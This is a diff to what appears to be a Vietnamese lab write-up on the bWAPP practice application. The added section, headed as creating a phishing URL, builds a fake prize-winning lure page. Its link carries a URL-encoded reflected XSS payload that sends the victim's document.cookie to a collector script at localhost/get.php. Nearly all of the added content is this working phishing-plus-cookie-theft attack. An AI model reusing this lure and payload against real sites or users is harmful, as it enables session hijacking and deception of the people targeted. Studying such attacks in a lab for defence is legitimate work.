@@ -40,5 +40,17 @@ Code php crawl cookie:
 ?>
 ```
 
-
+* Tạo một url phishing
+```html
+<html>
+  <head>
+      <title>CHUC MUNG!!!</title>
+  </head>
+  <body>
+      <h1 align="center">Bạn đã trúng tour du lịch vòng quanh Mỹ Đình</h1>
+      <h1 align="center">-Mỹ Đình Bus-</h1>
+  Xem thông tin chi tiết <a href='http://localhost/bwapp/xss_get.php?firstname=%3Cscript%3Ewindow.open%28%22http%3A%2F%2Flocalhost%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&lastname=Thiep&form=submit'>tai day</a> .
+  </body>
+</html>
+```
 
